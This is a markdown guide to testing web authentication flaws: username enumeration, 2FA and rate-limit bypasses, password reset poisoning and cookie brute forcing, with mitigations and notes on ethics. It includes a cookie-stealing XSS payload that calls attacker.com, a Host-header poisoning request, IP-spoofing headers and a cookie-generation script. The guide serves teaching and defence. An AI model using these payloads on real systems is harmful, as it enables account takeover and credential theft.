# 🔐 Authentication Vulnerabilities - Security Testing Guide

## 📋 Table of Contents

1. Username Enumeration
2. 2FA Bypass Techniques
3. Password Reset Vulnerabilities
4. Brute Force Protection Bypass
5. Cookie-Based Attacks
6. Password Change Vulnerabilities
7. Mitigation Strategies

---

## ⚠️ Important Notice

**Educational Purpose Only:** This guide is for authorized security testing, bug bounty programs, and educational purposes. Always obtain proper authorization before testing any system.

---

## 🔍 Username Enumeration

### 1. 🎯 Via Different Responses

**Vulnerability:** Website returns different error messages for valid vs invalid usernames

**How It Works:**

- Invalid username: "Invalid username"
- Valid username: "Invalid password"

**Testing Steps:**

```
1. Attempt login with test username
2. Note the error message
3. Compare responses for different usernames
4. Use wordlist to identify valid usernames
```

**Impact:** 🔴 Medium - Reduces brute force complexity

---

### 2. ⏱️ Via Response Timing

**Vulnerability:** Server processing time differs based on username validity

**How It Works:**

- Valid username: Longer processing (password verification)
- Invalid username: Quick rejection

**Testing Steps:**

```
1. Add X-Forwarded-For header to bypass rate limiting
2. Use very long password (e.g., 200+ characters)
3. Test multiple usernames and measure response times
4. Username with longest response = likely valid
```

**Bypass Technique:**

```http
X-Forwarded-For: <random-ip>
```

**Impact:** 🔴 Medium - Timing-based information disclosure

---

### 3. 📝 Via Subtly Different Responses

**Vulnerability:** Minor differences in error messages or response length

**Testing Steps:**

```
1. Capture login request
2. Send to Intruder/testing tool
3. Add username as payload position
4. Use "Grep Match" to detect subtle differences
5. Look for response length variations
```

**Detection Methods:**

- Response length differences
- Minor wording changes
- Extra whitespace
- Different HTTP status codes

**Impact:** 🟡 Low-Medium - Requires careful analysis

---

### 4. 🔒 Via Account Lock

**Vulnerability:** Different behavior when account exists vs doesn't exist

**How It Works:**

- Invalid username: No lockout ever occurs
- Valid username: Account locks after failed attempts

**Testing Steps:**

```
1. Capture login request
2. Test with multiple invalid passwords
3. Valid usernames will eventually lock
4. Invalid usernames never lock
```

**Impact:** 🔴 Medium - Confirms valid usernames

---

## 🛡️ 2FA Bypass Techniques

### 1. 🚪 Simple 2FA Bypass

**Vulnerability:** Direct navigation after first authentication factor

**How It Works:**

```
1. Enter valid credentials (step 1)
2. Redirected to /login2 (2FA page)
3. Manually navigate to /my-account
4. Access granted without 2FA!
```

**URL Manipulation:**

```
Before: https://example.com/login2
After:  https://example.com/my-account
```

**Impact:** 🔴 Critical - Complete 2FA bypass

---

### 2. 🔓 2FA Broken Logic

**Vulnerability:** Server doesn't verify which user is completing 2FA

**How It Works:**

```
1. Login with known credentials
2. Capture GET /login2 request
3. Change username parameter to victim
4. Server generates 2FA code for victim
5. Brute force the 2FA code (usually 4-6 digits)
```

**Testing Steps:**

```
1. Login with test account
2. Send /login2 request to repeater
3. Modify username parameter to target
4. Submit 2FA request with modified username
5. Brute force 2FA code (0000-9999)
```

**Impact:** 🔴 Critical - Account takeover via 2FA bypass

---

## 🔑 Password Reset Vulnerabilities

### 1. 🐛 Broken Reset Logic

**Vulnerability:** Password reset doesn't validate session/cookie ownership

**How It Works:**

```
1. Initiate password reset for your account
2. Capture the reset request
3. Change username parameter to victim
4. Reset completes for victim's account
```

**Testing Steps:**

```
1. Request password reset for test account
2. Intercept the reset submission request
3. Modify username/email parameter
4. Submit - victim's password is now reset
```

**Impact:** 🔴 Critical - Account takeover

---

### 2. 🎭 Password Reset Poisoning

**Vulnerability:** Host header injection in password reset emails

**How It Works:**

```
1. Request password reset for victim
2. Add malicious header: X-Forwarded-Host: attacker.com
3. Victim receives reset link pointing to attacker.com
4. Victim clicks link, token captured
```

**Attack Payload:**

```http
POST /forgot-password
Host: vulnerable-site.com
X-Forwarded-Host: attacker.com

email=victim@example.com
```

**Impact:** 🔴 High - Token stealing via email manipulation

---

## 🚫 Brute Force Protection Bypass

### 1. 🔄 IP Block Bypass

**Vulnerability:** Rate limiting resets with successful login

**How It Works:**

```
Rate limit: 3 failed attempts = IP block
Bypass: Insert valid credentials every 2 attempts
```

**Attack Pattern:**

```
Attempt 1: wrong_password_1
Attempt 2: wrong_password_2
Attempt 3: CORRECT_PASSWORD (reset counter)
Attempt 4: wrong_password_3
Attempt 5: wrong_password_4
Attempt 6: CORRECT_PASSWORD (reset counter)
...continue pattern
```

**Pitchfork Attack Setup:**

```
Username payload:
correct_user, correct_user, correct_user, correct_user...

Password payload:
wrong_1, wrong_2, CORRECT, wrong_3, wrong_4, CORRECT...
```

**Impact:** 🔴 High - Complete bypass of rate limiting

---

### 2. 🌐 X-Forwarded-For Bypass

**Technique:** Spoof source IP to bypass IP-based rate limiting

**Headers to Try:**

```http
X-Forwarded-For: <random-ip>
X-Originating-IP: <random-ip>
X-Remote-IP: <random-ip>
X-Remote-Addr: <random-ip>
```

**Impact:** 🟡 Medium - Depends on server configuration

---

## 🍪 Cookie-Based Attacks

### 1. 🔐 Stay-Logged-In Cookie Brute Force

**Vulnerability:** Predictable cookie encoding scheme

**Common Pattern:**

```
Cookie = base64(username:md5(password))
Example: base64("carlos:5f4dcc3b5aa765d61d8327deb882cf99")
```

**Attack Steps:**

```
1. Login with known credentials
2. Decode stay-logged-in cookie
3. Identify encoding pattern
4. Generate cookie payloads:
   - Hash each password (MD5)
   - Prefix with "username:"
   - Base64 encode result
5. Brute force with generated cookies
```

**Payload Generation:**

```python
import base64
import hashlib

username = "carlos"
passwords = ["password1", "password2", ...]

for pwd in passwords:
    hash_pwd = hashlib.md5(pwd.encode()).hexdigest()
    cookie = base64.b64encode(f"{username}:{hash_pwd}".encode())
    # Test with this cookie
```

**Impact:** 🔴 High - Account compromise via cookie manipulation

---

### 2. 🎣 Password Stealing via XSS

**Vulnerability:** XSS can exfiltrate authentication cookies

**Attack Payload:**

```javascript
<script>
document.location='//attacker.com/steal?cookie='+document.cookie
</script>
```

**Full Attack Chain:**

```
1. Find XSS vulnerability
2. Inject cookie-stealing payload
3. Victim executes payload
4. Receive cookie on attacker server
5. Decode cookie to extract credentials
```

**Impact:** 🔴 Critical - Combines XSS + authentication bypass

---

## 🔧 Password Change Vulnerabilities

### 1. 🐞 Broken Password Change Logic

**Vulnerability:** Error messages reveal current password validity

**How It Works:**

**Scenario A** (Normal behavior):

```
Current Password: WRONG
New Password 1: test123
New Password 2: test123
Result: Logged out (no useful info)
```

**Scenario B** (Exploitable):

```
Current Password: WRONG
New Password 1: test123
New Password 2: different456
Result: "Current password is incorrect" (useful!)
```

**Attack Steps:**

```
1. Stay logged in as attacker
2. Use password change function
3. Set current password to brute force attempt
4. Set new passwords to DIFFERENT values
5. Error message reveals if current password was correct
6. Brute force using this oracle
```

**Impact:** 🔴 High - Password brute force via change function

---

## 🛡️ Mitigation Strategies

### For Username Enumeration

✅ **Implement:**

- Generic error messages ("Invalid credentials")
- Consistent response times
- Rate limiting on failed attempts
- CAPTCHA after failed attempts
- Account lockout with consistent behavior

### For 2FA Bypass

✅ **Implement:**

- Strict session validation
- Bind 2FA to specific user session
- Time-limited 2FA codes
- Rate limiting on 2FA attempts
- Cannot skip 2FA step via URL manipulation

### For Password Reset

✅ **Implement:**

- Cryptographically random tokens
- Token expiration (15-30 minutes)
- One-time use tokens
- Validate user session/cookies
- Ignore host header manipulation
- Send reset links to registered email only

### For Brute Force Protection

✅ **Implement:**

- Progressive delays after failures
- CAPTCHA after 3 failed attempts
- Account lockout (temporary)
- Monitor for distributed attacks
- Multi-factor authentication
- Anomaly detection

### For Cookie Security

✅ **Implement:**

- Use cryptographically secure tokens (not predictable encoding)
- HttpOnly flag (prevent XSS access)
- Secure flag (HTTPS only)
- SameSite attribute
- Regular token rotation
- Don't encode passwords in cookies

---

## 📊 Vulnerability Severity Matrix

|Vulnerability|Severity|CVSS Range|Impact|
|---|---|---|---|
|Simple 2FA Bypass|🔴 Critical|9.0-10.0|Complete authentication bypass|
|Password Reset Broken Logic|🔴 Critical|8.0-9.0|Account takeover|
|2FA Broken Logic|🔴 Critical|8.5-9.5|Account takeover|
|Stay-Logged-In Brute Force|🔴 High|7.0-8.0|Credential compromise|
|Username Enumeration|🟡 Medium|5.0-6.0|Information disclosure|
|Response Timing|🟡 Medium|4.0-5.0|Information disclosure|
|Rate Limit Bypass|🔴 High|7.0-8.0|Enables brute force|

---

## 🧪 Testing Checklist

### Authentication Testing

- [ ] Test for username enumeration (responses, timing, lockout)
- [ ] Test 2FA implementation (bypass, logic flaws)
- [ ] Test password reset (token validation, logic)
- [ ] Test brute force protection (rate limiting, IP blocks)
- [ ] Test session management (cookies, tokens)
- [ ] Test password change functionality
- [ ] Test for XSS in authentication forms
- [ ] Test header injection (X-Forwarded-Host, etc.)

### Tools to Use

- 🔧 **Burp Suite:** Intercept and modify requests
- 🔧 **OWASP ZAP:** Automated scanning
- 🔧 **Intruder:** Payload-based attacks
- 🔧 **Custom Scripts:** Timing attacks, cookie generation

---

## 💡 Best Practices for Security Testers

### 1. 📝 Documentation

- Record all findings with screenshots
- Note exact reproduction steps
- Include proof-of-concept code
- Document impact and severity

### 2. 🎯 Responsible Disclosure

- Report to bug bounty program or security team
- Allow reasonable time for remediation
- Don't exploit beyond proof-of-concept
- Protect discovered credentials

### 3. ⚖️ Legal Compliance

- Only test authorized systems
- Follow bug bounty program rules
- Respect scope limitations
- Maintain confidentiality

### 4. 🔒 Ethical Guidelines

- Never access other users' data
- Don't cause service disruption
- Report vulnerabilities promptly
- Help improve security posture

---

## 🎓 Learning Resources

### Practice Platforms

- **PortSwigger Web Security Academy** (Free labs)
- **HackTheBox**
- **TryHackMe**
- **OWASP WebGoat**

### Further Reading

- OWASP Authentication Cheat Sheet
- NIST Digital Identity Guidelines
- CWE-287: Improper Authentication
- OAuth 2.0 Security Best Practices

---

_This guide is for educational and authorized security testing purposes only. Always obtain proper authorization and follow responsible disclosure practices._